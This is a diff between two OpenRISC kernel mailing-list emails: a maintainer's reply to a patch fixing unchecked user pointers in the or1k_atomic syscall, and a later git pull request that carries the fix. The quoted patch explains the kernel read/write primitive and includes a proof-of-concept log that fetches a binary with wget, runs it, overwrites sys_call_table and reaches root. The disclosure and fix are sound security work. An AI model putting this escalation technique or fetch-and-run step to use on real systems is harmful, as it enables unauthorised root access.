@@ -1,77 +1,70 @@
-Received: from mail-wm1-f52.google.com (mail-wm1-f52.google.com [209.85.128.52])
+Received: from mail-wr1-f52.google.com (mail-wr1-f52.google.com [209.85.221.52])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 5C2C530D3E9
-	for <linux-openrisc@vger.kernel.org>; Sat, 29 Aug 2026 06:29:33 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.128.52
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id DEEAA34A3C9
+	for <linux-openrisc@vger.kernel.org>; Sat, 29 Aug 2026 06:40:28 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.221.52
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1787984975; cv=none; b=C55jGDDkceygTlreFOTz5Wn8J6DRisXsiH4x8SxrHsAaysMiJoung1LchcIU+eXN0Ud/AuP6sWJc8iqk7zU4aLUY5OKeE6QykY2cMJQD6UsqmaG0Jfiz7gBO1GufedFdLlgAsKcThr85/Aqv53q1yy+CETeRHzVzpKcwQhUJ4Kc=
+	t=1787985630; cv=none; b=hoqj42oFEwaZcBZV6p+LJcS2KEYY6WOb5/L7/eo6pkS24bl+Ygt/NzloNTUsUt6csIVtiQiARrQXfB5EZmNzCr0YMUafa33oMM4rsFNSQMvP0AvEpOrfwX0YwBNnuBi7xzH5uBrMzOsrK4F5C7hxpBfvufl7YUGsvgyOXwd6oS8=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1787984975; c=relaxed/simple;
-	bh=SiU/2OsQxhZj+EY9kQ5PjA3CQm4G6D2vCxthW14z8rY=;
-	h=Date:From:To:Cc:Subject:Message-ID:References:MIME-Version:
-	 Content-Type:Content-Disposition:In-Reply-To; b=EUm3P7eZKJc3U2E3aDx/UEyfKzE3EGjpWy4VPNZ4tmG2ZGz8LmTZDSwz0NxBYt4zMBUcZ13qZ9rMASrbfdLqYlFKHTH56IAEDn7dnt1a2v+5V6mQ1Ri4T5n0mTrrMRv08M20q8L8GSI6RaQzi4Jj1yLv8c23wg3ohnw/Y4mP+s8=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=ZB996Zv0; arc=none smtp.client-ip=209.85.128.52
+	s=arc-20240116; t=1787985630; c=relaxed/simple;
+	bh=Sseqr9v2u+9IdH1ncKFIbfqzrLnecsZu0AT53ZZPrpY=;
+	h=Date:From:To:Cc:Subject:Message-ID:MIME-Version:Content-Type:
+	 Content-Disposition; b=cvau7Hywq3MLsEV046+kw9MvbpsemEhymozkptgLgqzdZJJqgwQxQNtcqGogXiRb+608rCVsdXDzpALUty+fNgL/pN9yPGI4WB9C9ua7a9QJ7zSBkB0qbY1Ra2Ntpq3AIR8p9q869GHb495P7xMAN+VXQvQu4mkbxvuvx/IwzDg=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=LNBTOLFE; arc=none smtp.client-ip=209.85.221.52
 Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
 Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="ZB996Zv0"
-Received: by mail-wm1-f52.google.com with SMTP id 5b1f17b1804b1-49800c6a846so16739565e9.3
-        for <linux-openrisc@vger.kernel.org>; Fri, 28 Aug 2026 23:29:33 -0700 (PDT)
+	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="LNBTOLFE"
+Received: by mail-wr1-f52.google.com with SMTP id ffacd0b85a97d-482e4998d28so1177708f8f.2
+        for <linux-openrisc@vger.kernel.org>; Fri, 28 Aug 2026 23:40:28 -0700 (PDT)
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=gmail.com; s=20251104; t=1787984971; x=1788589771; darn=vger.kernel.org;
-        h=in-reply-to:content-disposition:content-type:mime-version
-         :references:message-id:subject:cc:to:from:date:from:to:cc:subject
-         :date:message-id:reply-to:content-type;
-        bh=2zLACw0pXpUYULJDZoulM61mRMjzPQIqT274DyKnsS4=;
-        b=ZB996Zv0BxqDTCG56kzqwKiqgPNNI0qZ9qIpHbg4ua2HTiMgiwBy60QuCHP4cl8FBC
-         VUELCUOCb6KP3uLAlfAsY3yKosksDGcwTwlw0uG8rBLNwTLY3gZmRMJZhpGroslOu6ni
-         thCcVAKSMGBgVKSC8rOecso/iMabDChWXFJyK5Q8USwdSK2EZqAbgsYD8HbIp0PBHtL+
-         SLWlZnOIrOHHbhACmSZMl3mdrZdUoDr6GKdWUFtS3u0PuTpcqyP71mf16JE78c0VQtkB
-         aUCaz6VqUnoC5uhTxVi6E/tBDOlbxBftkeqTF2vtn4zPCl4bVsWx/05hrTwlucyR1U5W
-         rjWA==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20251104; t=1787984971; x=1788589771;
-        h=in-reply-to:content-disposition:content-type:mime-version
-         :references:message-id:subject:cc:to:from:date:x-gm-gg
-         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to
+        d=gmail.com; s=20251104; t=1787985627; x=1788590427; darn=vger.kernel.org;
+        h=content-disposition:content-type:mime-version:message-id:subject:cc
+         :to:from:date:from:to:cc:subject:date:message-id:reply-to
          :content-type;
-        bh=2zLACw0pXpUYULJDZoulM61mRMjzPQIqT274DyKnsS4=;
-        b=KSpR++PyUw7vfVNUPElDw+UMwzIk66DGdcnvt5Dizo7SipaTFCfKdtF8FK3V6CzYe8
-         JvqmaJBx4Wp+/dXKFt8DamTroV0JfjnwsiubLnrZ6pk3/WN8pHbcDmrBQOZnBoyLemFZ
-         AXkQ+8AH7xGcSVvPswSsjHWVROnQfzyXfYcroY5qTRplkkx/wiLNL1QC3yiLNEh+Q/Go
-         q2jpwQ11cDoyDl9PGIs3SFrk1TygXbc566xhWF4YZcUFTmP/x5ghoa8ReOVrkEx6pL+p
-         pn2puDuhNYjx5lvuV0SZo38oLDDK3IU/qBgyb6AsnuGB+gnfeGk5UaQiMB1gHz84W7N+
-         FX/g==
-X-Forwarded-Encrypted: i=1; AHgh+RqS0czcoC3mz336pa0Yojl6kSKh2vozGKZsBdJVam9Rhn9repGHjw5wqZN1aZfF8VGatYSu2OabJwCg80cZTA==@vger.kernel.org
-X-Gm-Message-State: AFuF++nDHGAL6I6lGCydnkgobWZ1zhhWpeZPbWEJwUdZLlCMQMutvf8y
-	4i32c/TvNBC1/lShRWu2STW+2K15jTnRTSPIeNRVuRA4rBztIXdTthtS
-X-Gm-Gg: AR+sD13+9gjFJvPdiAYXPD/Ahp8Z+Vh2ypfhzYhMJMp4bVV2OrCfjuY2cUH0DsEMAu2
-	fkR70WLGq533ZG9R3Gdj6NhX+JMQ17dcoWhqu91b55KBs3V/wgDCW0JjpGvktlcOrTxdB5/vW8c
-	8VzgNYK+nyUDkzJqx7+eBrrIEWI88LQg7bYVfmC0s3yOqVFkmZvXdX8Q4wMEbD/xBTnD6vkjgmE
-	Cn4ytSGr6sOA+oTu6IfP4RaKRynNn94VKxamDxAIJhnBSPTtB+jCy3Mtu/bSJxAta6ozmNSFVQZ
-	saeIPSNVUOdwqArfw6dLSTL254EQkvzaBzJSscqSAJF8EVftyXp8LWgbUJlad/f3FW8e4mByWGt
-	4ivjDSHKd5LoL+VyctU2bHEX7ZrAjNBACjMRcGdum08/A+O1be80Hr3HuqGAX4IyO+C0mVF08yN
-	joxooQ4FKThj8OUoohR+qWuzKTYTcGL/F7grrwNtGxGQSlAHZI/LUi0TQAKJyzIO/r2dr0ozc7c
-	ZI6bBRyfNZKgKTJhTqAzcn7lh38HhR+5IUXp0yZZrQ=
-X-Received: by 2002:a05:600c:3145:b0:499:79b9:e220 with SMTP id 5b1f17b1804b1-49b91c44f6cmr174203445e9.10.1787984971174;
-        Fri, 28 Aug 2026 23:29:31 -0700 (PDT)
+        bh=7DWtTAQIr3GS9yNff27bhqyvWbMb6qON5ieBsdlpRi8=;
+        b=LNBTOLFEbiwrsvcDZDDskP24HzHsQqRF+6dC15Ly8gIOnen95xVLjtVzO7RLuRaNji
+         jE+esUyT3qlDyefgbN/4GMlR65ERoYeYxbUN1GdPWO/9iTqYsJazXGHw1rfDEhfcsbpY
+         L3CreqWr9S1uu5S+NiF42jS/hdxgltbVOMpaLIlhImS4+e13s3Pm0ZN9B1AyKLbwUD9a
+         5GKkK4ibhd9QbMt/lN66esjdIZCWOq8wCDwlfn83gaQJMVZCDlrUpDuauYlXqu9tbUoj
+         KC+5m5mtUSFxMTotJAN2jMpGkN1w8MViYc7UezXTN9ycWTpNCKMhkqIiQNSDTPUVNQqX
+         JHcw==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20251104; t=1787985627; x=1788590427;
+        h=content-disposition:content-type:mime-version:message-id:subject:cc
+         :to:from:date:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
+         :message-id:reply-to:content-type;
+        bh=7DWtTAQIr3GS9yNff27bhqyvWbMb6qON5ieBsdlpRi8=;
+        b=AYqD23IgQxbTlYYkwfmelQEpHJPUJiu/x2DTaQLq69FCU+pv9S6YI6B1SIXqTx6IOr
+         xTDrT1rmlMtKGYELJABJ5IBfpllql//mID8Cm70KXQDPmQjhvj7RCxFAwDFW9gd88scS
+         d11ymb27blfbQ7rdEQRPALTeyqmNk5pvV8FotzYi4pGoWqXvUzcYJRKQfIp2WBYquC1x
+         GAK6ZqiREU+MImnqlvnbYneb2xCkbSLr0Fokx7IItnuCTFkNcr9TFLI/PjmuydxcbzHC
+         LQJM2JdzWgmfG05VOJoDVwkyHXf3ergPQZyD6Yd+wVJTv96gfV07xpRTzqmdIR3rIKHO
+         ElaA==
+X-Gm-Message-State: AFuF++lBOWzSwBqk7iiA2ReYHuhk0EBkjagFj3/T9FwiUQtGdWYaVHz1
+	VnbMjsPg+BVL+zfM2m2KZliGsXgOQ/XrPvZEl3fP68bhKaU/vHPDAVvNDIVkpA==
+X-Gm-Gg: AR+sD120HHDj0SR2ReToYusY13bHKCFrMZgoLVr5Qaq1qI2w0IO7+V0/qxumIz0j8DX
+	KEI7Xqrd7KXQHCMefcT4OLtF8AEP4Gml3ke04O07sc306kP+Sa0iFYzgbElhZDhQ3gnGpxP5fQr
+	GakplEZstWczO9E74wI6iLgG+zMbhktq5wy4RSc+hNXgPw3J7grYI0XTyyO3J51lA4Qvc2QOMrM
+	c9Q/IRJ3ziz2eZFiJrWj7/MWFwT/nIhHgOhQnz++mk01t8gguZSyiNvWdR4ApwGPPsudLjWSRvT
+	sdq6dQ2jL93Wkl7JLhg97+k4qKS8JX6QOXyp8RWabdZDRaW4gL/6jCdzj3xvTIEISM6BWc4W4D6
+	W+YrLwejYFacGRwmGt0p0kS0/nIVjoYe7+g6C5S3W95ADgKuYTwRCHDp36iKiG8hwxwF7lQnNgK
+	f4AsFx9sei9Z6DkzzojGuoLQgiKNw1qlJq2EzE7L+7uEKfu/dsb54GjY+bwRFiWhhvMSGORV2p/
+	k7MktnfPhjI4Dbms8JNpYKJsAtp9wspY4WT/OaKltU=
+X-Received: by 2002:a05:600c:c170:b0:499:afe2:e4d0 with SMTP id 5b1f17b1804b1-49b91c2930dmr196281065e9.8.1787985626920;
+        Fri, 28 Aug 2026 23:40:26 -0700 (PDT)
 Received: from localhost (brnt-04-b2-v4wan-170138-cust2432.vm7.cable.virginm.net. [94.175.9.129])
-        by smtp.gmail.com with ESMTPSA id ffacd0b85a97d-482fbb20793sm8088685f8f.17.2026.08.28.23.29.30
+        by smtp.gmail.com with ESMTPSA id 5b1f17b1804b1-49b94dc103dsm99954485e9.1.2026.08.28.23.40.26
         (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
-        Fri, 28 Aug 2026 23:29:30 -0700 (PDT)
-Date: Sat, 29 Aug 2026 07:29:29 +0100
+        Fri, 28 Aug 2026 23:40:26 -0700 (PDT)
+Date: Sat, 29 Aug 2026 07:40:25 +0100
 From: Stafford Horne <shorne@gmail.com>
-To: Ali Ahmet Memis <ali@iusegentoo.com>
-Cc: Jonas Bonn <jonas@southpole.se>,
-	Stefan Kristiansson <stefan.kristiansson@saunalahti.fi>,
-	Arnd Bergmann <arnd@arndb.de>, linux-openrisc@vger.kernel.org,
-	linux-kernel@vger.kernel.org, stable@vger.kernel.org
-Subject: Re: [PATCH v2] openrisc: fix arbitrary kernel memory access via
- or1k_atomic syscall
-Message-ID: <apJ8SWRA0PxaQEs9@antec>
-References: <20260821013839.587041-1-ali@iusegentoo.com>
- <20260821014543.588228-1-ali@iusegentoo.com>
+To: Linus Torvalds <torvalds@linux-foundation.org>
+Cc: Linux OpenRISC <linux-openrisc@vger.kernel.org>,
+	LKML <linux-kernel@vger.kernel.org>
+Subject: [GIT PULL] OpenRISC 7.3 updates
+Message-ID: <apJ-2fH66_goKXF0@antec>
 Precedence: bulk
 X-Mailing-List: linux-openrisc@vger.kernel.org
 List-Id: <linux-openrisc.vger.kernel.org>
@@ -80,170 +73,39 @@ List-Unsubscribe: <mailto:linux-openrisc+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
 Content-Type: text/plain; charset=us-ascii
 Content-Disposition: inline
-In-Reply-To: <20260821014543.588228-1-ali@iusegentoo.com>
 
-On Fri, Aug 21, 2026 at 01:45:27AM +0000, Ali Ahmet Memis wrote:
-> sys_or1k_atomic() (syscall 244 in the "or1k" ABI) takes two user
-> pointers, v1 and v2, and swaps the words they point to in hand-written
-> assembly.
-> 
->     l.lwz   r29,0(r4)
->     l.lwz   r27,0(r5)
->     l.sw    0(r4),r27
->     l.sw    0(r5),r29
-> 
-> The pointers are not checked with access_ok(). The four memory
-> accesses also have no exception table entries.
-> 
-> A caller passes a kernel address as either pointer, and the syscall
-> reads from and writes to it directly.
-> 
-> This gives an unprivileged process a kernel read/write primitive. It
-> overwrites kernel data such as the sys_call_table, gaining code
-> execution in kernel context.
-> 
-> Check both pointers before entering the critical section. Add fixups
-> for the four memory accesses so faults on valid but unmapped user
-> addresses return -EFAULT.
-> 
-> Fixes: 9d02a4283e9c ("OpenRISC: Boot code")
-> Cc: stable@vger.kernel.org
-> Signed-off-by: Ali Ahmet Memis <ali@iusegentoo.com>
-> ---
-> v2: add Cc: stable@vger.kernel.org, missed in v1.
-> 
-> Tested against an unpatched or1ksim build with a local PoC that uses
-> this syscall to overwrite a sys_call_table entry and escalate to root:
-> 
-> ali@archlinux:~$ cd ~/or1k-build/buildroot/output/images
-> ali@archlinux:~/or1k-build/buildroot/output/images$ qemu-system-or1k -kernel vmlinux -nographic -append "console=ttyS0"
-> FDT at (ptrval)
-> Linux version 6.18.7 (ali@archlinux) (or1k-buildroot-linux-musl-gcc.br_real (Buildroot -g86102dd8) 15.3.0, GNU ld (GNU Binutils) 2.45.1) #5 Fri Aug 21 00:38:10 UTC 2026
-> OF: reserved mem: Reserved memory: No reserved-memory node in the DT
-> CPU: OpenRISC-13 (revision 8) @20 MHz
-> -- dmmu:  128 entries, 1 way(s)
-> -- immu:  128 entries, 1 way(s)
-> -- additional features:
-> -- power management
-> -- PIC
-> -- timer
-> Initial ramdisk not found
-> Setting up paging and PTEs.
-> map_ram: Memory: 0x0-0x8000000
-> Zone ranges:
->   Normal   [mem 0x0000000000000000-0x0000000007ffffff]
-> Movable zone start for each node
-> Early memory node ranges
->   node   0: [mem 0x0000000000000000-0x0000000007ffffff]
-> Initmem setup node 0 [mem 0x0000000000000000-0x0000000007ffffff]
-> itlb_miss_handler (ptrval)
-> dtlb_miss_handler (ptrval)
-> OpenRISC Linux -- http://openrisc.io
-> Kernel command line: console=ttyS0
-> printk: log buffer data + meta data: 131072 + 409600 = 540672 bytes
-> Dentry cache hash table entries: 16384 (order: 3, 65536 bytes, linear)
-> Inode-cache hash table entries: 8192 (order: 2, 32768 bytes, linear)
-> Sorting __ex_table...
-> Built 1 zonelists, mobility grouping on.  Total pages: 16384
-> mem auto-init: stack:all(zero), heap alloc:off, heap free:off
-> mem_init_done ...........................................
-> SLUB: HWalign=16, Order=0-3, MinObjects=0, CPUs=1, Nodes=1
-> NR_IRQS: 32, nr_irqs: 32, preallocated irqs: 0
-> clocksource: openrisc_timer: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 95563022313 ns
-> Console: colour dummy device 80x25
-> 40.00 BogoMIPS (lpj=80000)
-> $ id
-> uid=1000(test) gid=1000(test) groups=1000(test)
-> $ wget -O /tmp/x http://10.0.2.2:8000/lpe_static
-> Connecting to 10.0.2.2:8000 (10.0.2.2:8000)
-> saving to '/tmp/x'
-> x                    100% |********************************|  174k  0:00:00 ETA
-> '/tmp/x' saved
-> $ chmod +x /tmp/x
-> $ /tmp/x
-> Initial: uid=1000 euid=1000
-> Installing commit_creds into getuid entry
-> sys_call_table[174] overwritten
-> original handler = 0xc002e2ac
-> Calling hijacked syscall with init_cred
-> hijacked syscall returned 0
-> Restoring original getuid handler
-> syscall table restored
-> Final identity: uid=0 euid=0
-> # id
-> uid=0(root) gid=0(root)
-> #
-> 
->  arch/openrisc/kernel/entry.S | 42 ++++++++++++++++++++++++++++++++++++++---
->  1 file changed, 39 insertions(+), 3 deletions(-)
-> 
-> diff --git a/arch/openrisc/kernel/entry.S b/arch/openrisc/kernel/entry.S
-> index c7e90b09645e..2e8c4102cd62 100644
-> --- a/arch/openrisc/kernel/entry.S
-> +++ b/arch/openrisc/kernel/entry.S
-> @@ -1223,15 +1223,49 @@ _no_syscall_trace:
->   *
->   */
-> 
-> +/* Keep this literal; hi()/lo() can't use the UL-suffixed TASK_SIZE. */
-> +#define OR1K_ATOMIC_ADDR_LIMIT	0x7ffffffc
+Hello Linus,
 
-OK, it would have been good to use TASK_SIZE.
+Please consider for pull,
 
->  ENTRY(sys_or1k_atomic)
+The following changes since commit db2ddb87143519e20a95aa36c60b36107b736a58:
 
-Note, I don't know of any applications that actually use this, we should
-deprecated this syscall.  But I do see it available in musl and strace, it would
-take some time to cleanup.
+  Linux 7.2-rc7 (2026-08-09 14:54:50 -0700)
 
->  	/* FIXME: This ignores r3 and always does an XCHG */
-> +
-> +	/* Check both user pointers before accessing them. */
-> +	l.movhi	r13,hi(OR1K_ATOMIC_ADDR_LIMIT)
-> +	l.ori	r13,r13,lo(OR1K_ATOMIC_ADDR_LIMIT)
-> +	l.sfgtu	r4,r13
-> +	l.bf	9f
-> +	 l.nop
-> +	l.sfgtu	r5,r13
-> +	l.bf	9f
-> +	 l.nop
-> +
->  	DISABLE_INTERRUPTS(r17,r19)
-> -	l.lwz	r29,0(r4)
-> -	l.lwz	r27,0(r5)
-> -	l.sw	0(r4),r27
-> -	l.sw	0(r5),r29
-> +10:	l.lwz	r29,0(r4)
-> +11:	l.lwz	r27,0(r5)
-> +12:	l.sw	0(r4),r27
-> +13:	l.sw	0(r5),r29
->  	ENABLE_INTERRUPTS(r17)
->  	l.jr	r9
->  	 l.or	r11,r0,r0
-> 
-> +	/* Either pointer was outside user space, or turned out to be
-> +	 * unmapped/inaccessible when we actually touched it.
-> +	 */
-> +9:	l.jr	r9
-> +	 l.addi	r11,r0,-EFAULT
-> +
-> +	.section .fixup, "ax"
-> +14:
-> +	ENABLE_INTERRUPTS(r17)
-> +	l.j	9b
-> +	 l.nop
-> +	.previous
-> +
-> +	.section __ex_table, "a"
-> +	.long	10b, 14b
-> +	.long	11b, 14b
-> +	.long	12b, 14b
-> +	.long	13b, 14b
-> +	.previous
-> +
+are available in the Git repository at:
 
-Thanks,
+  https://github.com/openrisc/linux.git tags/for-linus
 
-I will send this upstream.
+for you to fetch changes up to 78004e9a87f240df03e2f73120d291763c32e0a7:
 
--Stafford
+  openrisc: fix arbitrary kernel memory access via or1k_atomic syscall (2026-08-29 07:32:26 +0100)
+
+----------------------------------------------------------------
+OpenRISC 7.3 updates
+
+One small item and one bug fix.
+
+ * The bug fix is to fix an unchecked access in our or1k_atomic syscall,
+   I am debating if we should just deprecate this as there is minimal
+   need for it.
+
+----------------------------------------------------------------
+Ali Ahmet Memis (1):
+      openrisc: fix arbitrary kernel memory access via or1k_atomic syscall
+
+Julia Lawall (1):
+      openrisc: drop unneeded semicolon
+
+ arch/openrisc/kernel/entry.S | 43 +++++++++++++++++++++++++++++++++++++++----
+ arch/openrisc/mm/tlb.c       |  4 ++--
+ 2 files changed, 41 insertions(+), 6 deletions(-)
